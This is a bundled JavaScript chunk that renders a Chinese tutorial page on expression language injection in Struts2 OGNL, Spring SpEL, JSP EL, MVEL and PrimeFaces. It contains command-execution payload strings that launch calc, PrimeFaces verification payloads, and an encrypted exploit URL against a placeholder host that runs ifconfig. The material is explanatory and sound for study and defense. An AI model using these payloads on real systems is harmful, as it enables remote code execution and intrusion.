(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[25],{167:function(e,a,t){"use strict";t.r(a),function(e){t.d(a,"default",(function(){return u}));var n,c=t(95),s=(t(139),t(0),t(96));function o(){return(o=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var t=arguments[a];for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n])}return e}).apply(this,arguments)}function p(e,a){if(null==e)return{};var t,n,c=function(e,a){if(null==e)return{};var t,n,c={},s=Object.keys(e);for(n=0;n<s.length;n++)t=s[n],a.indexOf(t)>=0||(c[t]=e[t]);return c}(e,a);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(n=0;n<s.length;n++)t=s[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(c[t]=e[t])}return c}(n="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.enterModule:void 0)&&n(e);"undefined"!=typeof reactHotLoaderGlobal&&reactHotLoaderGlobal.default.signature;var b,r,m=function(e){return function(a){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),Object(s.b)("div",a)}},N={},l="wrapper";function u(e){var a=e.components,t=p(e,["components"]);return Object(s.b)(l,o({},N,t,{components:a,mdxType:"MDXLayout"}),Object(s.b)("h1",{className:"__internal",id:"表达式注入"},"表达式注入",Object(s.b)("a",o({parentName:"h1"},{href:"#%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},"2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词。")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},"而这个时期，只不过还只是把它叫做远程代码执行漏洞、远程命令执行漏洞或者上下文操控漏洞。像Struts2系列的s2-003、s2-009、s2-016等，这种由OGNL表达式引起的命令执行漏洞。")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},"随着Expression Language越来越广泛的使用，它的受攻击面也随着展开，所以我们觉得有必要开始针对这种类型的漏洞进行一些研究，Expression Language Injection在将来甚至有可能成为SQL注入一样的存在。")),Object(s.b)("table",null,Object(s.b)("thead",{parentName:"table"},Object(s.b)("tr",{parentName:"thead"},Object(s.b)("th",o({parentName:"tr"},{align:null}),"Name"),Object(s.b)("th",o({parentName:"tr"},{align:null}),"Injection"))),Object(s.b)("tbody",{parentName:"table"},Object(s.b)("tr",{parentName:"tbody"},Object(s.b)("td",o({parentName:"tr"},{align:null}),"Struts2"),Object(s.b)("td",o({parentName:"tr"},{align:null}),"OGNL")),Object(s.b)("tr",{parentName:"tbody"},Object(s.b)("td",o({parentName:"tr"},{align:null}),"Spring"),Object(s.b)("td",o({parentName:"tr"},{align:null}),"SPEL")),Object(s.b)("tr",{parentName:"tbody"},Object(s.b)("td",o({parentName:"tr"},{align:null}),"JSP"),Object(s.b)("td",o({parentName:"tr"},{align:null}),"JSTL_EL")),Object(s.b)("tr",{parentName:"tbody"},Object(s.b)("td",o({parentName:"tr"},{align:null}),"Elasticsearch"),Object(s.b)("td",o({parentName:"tr"},{align:null}),"MVEL")))),Object(s.b)("h1",{className:"__internal",id:"表达式注入实例"},"表达式注入实例",Object(s.b)("a",o({parentName:"h1"},{href:"#%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BE%8B","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("h2",{className:"__internal",id:"struts2-ognl"},"Struts2 ——OGNL",Object(s.b)("a",o({parentName:"h2"},{href:"#struts2-ognl","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("h3",{className:"__internal",id:"基本介绍"},"基本介绍",Object(s.b)("a",o({parentName:"h3"},{href:"#%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"Strust2漏洞可谓是从一开始就高危到现在，一开始归类为命令执行，现在规范化为表达式注入，其表达式格式为"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(s.b)("pre",o({parentName:"div"},{className:"language-text"}),Object(s.b)("code",o({parentName:"pre"},{className:"language-text"}),"  @[类名]@[方法名|值]"))),Object(s.b)("p",null,"举例来说"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"java"},Object(s.b)("pre",o({parentName:"div"},{className:"language-java"}),Object(s.b)("code",o({parentName:"pre"},{className:"language-java"}),Object(s.b)("span",o({parentName:"code"},{className:"token annotation punctuation"}),"@java"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),"lang",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"String"),Object(s.b)("span",o({parentName:"code"},{className:"token annotation punctuation"}),"@format"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token string"}),"'foo %s'"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),",")," ",Object(s.b)("span",o({parentName:"code"},{className:"token string"}),"'test'"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")")))),Object(s.b)("h3",{className:"__internal",id:"基本用法"},"基本用法",Object(s.b)("a",o({parentName:"h3"},{href:"#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"java"},Object(s.b)("pre",o({parentName:"div"},{className:"language-java"}),Object(s.b)("code",o({parentName:"pre"},{className:"language-java"}),Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"ActionContext")," AC ",Object(s.b)("span",o({parentName:"code"},{className:"token operator"}),"=")," ",Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"ActionContext"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getContext"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"Map")," ",Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"Parameters")," ",Object(s.b)("span",o({parentName:"code"},{className:"token operator"}),"=")," ",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"Map"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),"AC",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getParameters"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"String")," expression ",Object(s.b)("span",o({parentName:"code"},{className:"token operator"}),"=")," ",Object(s.b)("span",o({parentName:"code"},{className:"token string"}),"\"${(new java.lang.ProcessBuilder('calc')).start()}\""),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),";"),"\nAC",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getValueStack"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"findValue"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),"expression",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("p",null,"相关漏洞有",Object(s.b)("inlineCode",{parentName:"p"},"s2-015"),"、",Object(s.b)("inlineCode",{parentName:"p"},"s2-016"),"，",Object(s.b)("inlineCode",{parentName:"p"},"s2-017"),"等等"),Object(s.b)("h2",{className:"__internal",id:"springspel"},"Spring——SPEL",Object(s.b)("a",o({parentName:"h2"},{href:"#springspel","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"SPEl为Spring框架的EL表达式，只在Spring框架中可用"),Object(s.b)("h3",{className:"__internal",id:"基本用法-1"},"基本用法",Object(s.b)("a",o({parentName:"h3"},{href:"#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95-1","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"java"},Object(s.b)("pre",o({parentName:"div"},{className:"language-java"}),Object(s.b)("code",o({parentName:"pre"},{className:"language-java"}),"java\n",Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"String")," expression ",Object(s.b)("span",o({parentName:"code"},{className:"token operator"}),"=")," ",Object(s.b)("span",o({parentName:"code"},{className:"token string"}),'"T(java.lang.Runtime).getRuntime().exec(/"'),"calc",Object(s.b)("span",o({parentName:"code"},{className:"token operator"}),"/"),Object(s.b)("span",o({parentName:"code"},{className:"token string"}),'")"'),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"String")," result ",Object(s.b)("span",o({parentName:"code"},{className:"token operator"}),"=")," parser",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"parseExpression"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),"expression",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getValue"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"toString"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("h2",{className:"__internal",id:"jspjstl_el"},"JSP——JSTL_EL",Object(s.b)("a",o({parentName:"h2"},{href:"#jspjstl_el","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"JSTL_EL为JSP自带的表达式，适用于所有的Java Web"),Object(s.b)("h3",{className:"__internal",id:"基本用法-2"},"基本用法",Object(s.b)("a",o({parentName:"h3"},{href:"#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95-2","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"jsp"},Object(s.b)("pre",o({parentName:"div"},{className:"language-jsp"}),Object(s.b)("code",o({parentName:"pre"},{className:"language-jsp"}),'jsp  \n<spring:message text=\n"${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}">\n</spring:message> '))),Object(s.b)("h3",{className:"__internal",id:"相关漏洞"},"相关漏洞",Object(s.b)("a",o({parentName:"h3"},{href:"#%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("blockquote",null,Object(s.b)("div",o({parentName:"blockquote"},{className:"rcpress-highlight","data-language":"text"}),Object(s.b)("pre",o({parentName:"div"},{className:"language-text"}),Object(s.b)("code",o({parentName:"pre"},{className:"language-text"}),"CVE-2011-2730")))),Object(s.b)("h2",{className:"__internal",id:"elasticsearchmvel"},"Elasticsearch——MVEL",Object(s.b)("a",o({parentName:"h2"},{href:"#elasticsearchmvel","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("p",null,"实例有CVE-2014-3120等，MVEL同OGNL和SPEL一样，具有通过表达式执行Java代码的强大功能"),Object(s.b)("h3",{className:"__internal",id:"基本用法-3"},"基本用法",Object(s.b)("a",o({parentName:"h3"},{href:"#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95-3","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"java"},Object(s.b)("pre",o({parentName:"div"},{className:"language-java"}),Object(s.b)("code",o({parentName:"pre"},{className:"language-java"}),"java ",Object(s.b)("span",o({parentName:"code"},{className:"token keyword"}),"import")," ",Object(s.b)("span",o({parentName:"code"},{className:"token namespace"}),"org",Object(s.b)("span",o({parentName:"span"},{className:"token punctuation"}),"."),"mvel"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),"MVEL",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),";"),"  \n",Object(s.b)("span",o({parentName:"code"},{className:"token keyword"}),"public")," ",Object(s.b)("span",o({parentName:"code"},{className:"token keyword"}),"class")," ",Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"MVELTest")," ",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"{"),"  \n        ",Object(s.b)("span",o({parentName:"code"},{className:"token keyword"}),"public")," ",Object(s.b)("span",o({parentName:"code"},{className:"token keyword"}),"static")," ",Object(s.b)("span",o({parentName:"code"},{className:"token keyword"}),"void")," ",Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"main"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"String"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"["),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"]")," args",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")")," ",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"{"),"  \n              ",Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"String")," expression ",Object(s.b)("span",o({parentName:"code"},{className:"token operator"}),"=")," ",Object(s.b)("span",o({parentName:"code"},{className:"token string"}),'"new java.lang.ProcessBuilder(/"'),"calc",Object(s.b)("span",o({parentName:"code"},{className:"token operator"}),"/"),Object(s.b)("span",o({parentName:"code"},{className:"token string"}),'").start();"'),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),";"),"  \n               ",Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"Boolean")," result ",Object(s.b)("span",o({parentName:"code"},{className:"token operator"}),"=")," ",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token class-name"}),"Boolean"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")")," MVEL",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"eval"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),"expression",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),",")," vars",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),";"),"  \n         ",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"}"),"  \n  ",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"}")," "))),Object(s.b)("h2",{className:"__internal",id:"primefaces框架"},"Primefaces框架",Object(s.b)("a",o({parentName:"h2"},{href:"#primefaces%E6%A1%86%E6%9E%B6","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("h3",{className:"__internal",id:"验证代码"},"验证代码",Object(s.b)("a",o({parentName:"h3"},{href:"#%E9%AA%8C%E8%AF%81%E4%BB%A3%E7%A0%81","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"java"},Object(s.b)("pre",o({parentName:"div"},{className:"language-java"}),Object(s.b)("code",o({parentName:"pre"},{className:"language-java"}),"$",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"{"),"facesContext",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getExternalContext"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getResponse"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getWriter"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"println"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token string"}),'"~~~elinject~~~"'),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"}"),"$",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"{"),"facesContext",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getExternalContext"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getResponse"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getWriter"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"flush"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"}"),"$",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"{"),"facesContext",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getExternalContext"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getResponse"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getWriter"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"close"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"}")))),Object(s.b)("h3",{className:"__internal",id:"web路径"},"Web路径",Object(s.b)("a",o({parentName:"h3"},{href:"#web%E8%B7%AF%E5%BE%84","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"java"},Object(s.b)("pre",o({parentName:"div"},{className:"language-java"}),Object(s.b)("code",o({parentName:"pre"},{className:"language-java"}),"$",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"{"),"facesContext",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getExternalContext"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getResponse"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getWriter"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"println"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),"request",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getSession"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getServletContext"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getRealPath"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token operator"}),"/"),Object(s.b)("span",o({parentName:"code"},{className:"token string"}),'"//"'),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"}"),"$",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"{"),"facesContext",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getExternalContext"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getResponse"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getWriter"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"flush"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"}"),"$",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"{"),"facesContext",Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getExternalContext"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getResponse"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"getWriter"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"."),Object(s.b)("span",o({parentName:"code"},{className:"token function"}),"close"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",o({parentName:"code"},{className:"token punctuation"}),"}")))),Object(s.b)("h3",{className:"__internal",id:"加密后的payload"},"加密后的Payload",Object(s.b)("a",o({parentName:"h3"},{href:"#%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84payload","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(s.b)("pre",o({parentName:"div"},{className:"language-text"}),Object(s.b)("code",o({parentName:"pre"},{className:"language-text"}),"uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5%2BOpbBXfBSCSkb2z5x8Cb2P%2FDS2BUn7odA0GflWHV%2B9J8uLGYIqPK9HY85O%2BJw0u5X9urorJfQZKJihsLCV%2BnqyXHs8i6uh4iIboLA2TZUiTbjc3SfybUTvPCjRdyT6rCe6MPQGqHYkBiX3K7fGPuwJ2XNONXI9N2Sup5MWcUUo87FbX3jESvOq2Bs3sDKU4bW3aCGbhUcA2ZEgSxkLcW6VKDnXV5hxvz6J4a4E6P8HCy9v8%2BdrRzmtKbwczXk%2B9n8Lm2KYS%2Fk2TJKpeKjPg0t%2BAiKzTiqak%3D"))),Object(s.b)("h3",{className:"__internal",id:"调用payload"},"调用Payload",Object(s.b)("a",o({parentName:"h3"},{href:"#%E8%B0%83%E7%94%A8payload","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(s.b)("pre",o({parentName:"div"},{className:"language-text"}),Object(s.b)("code",o({parentName:"pre"},{className:"language-text"}),"http://xx.xx.xx.xx/javax.faces.resource/?pfdrt=sc&;ln=primefaces&;pfdrid=1acBqv16SJhfc30NLxL/NinZaDI%2BoHqk1xDbSI8qOl4%2BoXsKFyqJq3gv2IBc1S89q6G1POSSKDNlzHE/%2BnsMuZgTDALpyOstkBkFVJNc2U/B%2BoceOqnpF5YZoWtF0W7qGxsImsumut7GQoKKMQcbwwL4coE07x6Mn09hfy94tuiiy6S8S1vr8kPPYzrUC5AveiE9ls7dLDiaQripnC0Z71fB1xCjkxw8wjZt3om1PT9Wq8YAqkHuBIo/soFBvM1YDnJosELhjmfoJdAGBRfullXUfVw5xEg9ykFpLaKugkbDIBgXtv58Xu4BrT0d5MAQ8BOVwjzSodkdllYCAeUklCDWRfFtZDORdcAzXVxTRkEn%2Bnx7qAFh8NwK/sDsXz6U1Q2Q/ny1UaEMFM9qrgVmfX181HXWc4TuETxLqUohfreYLJLW%2BAxcxzciqqoKj%2Bht/KJ%2B%2BGfzuNoSs0E9i9N/AL5PALrdTRg%2BuweD3CMLZgLDITkMx4z7dmP2daw2B98nrKOLHtG6nYDcDmSfy8d8IKMZJvuq/WT7JLm0PJ3UqDyvzHHjrPCDpTFhMUmftFFvi4APBpT41slHYoRKDbJMvU/upvKyAsy5xQKJ5s6x%2B4F%2By9p8Icp1TQfMcqIPwMQkvsOs8i61m6i96dpmxpfZPWprcigaWMhJG8/iYRg7ZygegrmSbovLy5Tr3Mc9GODgdTx7v396NJ75yQyU4ETmYEhNxWTIoncK7MbyBcIWR/h1GjhCwwpquKRWLb3hal8DNJxubaKnxGa9mRNaQAZRr0s%2B3eo1jeino5O8CSQzla7ACpJc3867AAGxnWrnE/weJ20W3QKj6nIz/EAyx87aVIKs%2BQH3O4IGx%2BuiZ38TvMeg6jZpkZGiRNEUEuAoV6CWlMA%2BxM6BPvbPyWsqmdI8l%2ByFBhsoSpNhel2%2B0gxS5wWqZbRyi0rjPlOzUe8Xir9mlpuBZzrUIcbaYaE8PHQno1OZ/zaHx/GzAJakSRQ5YbKQ/W/OzkokDG3M79KSCtx2jN92PtISucY%3D&;cmd=ifconfig"))))}u.isMDXComponent=!0,u=Object(c.hot)(e)(u),(b="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.default:void 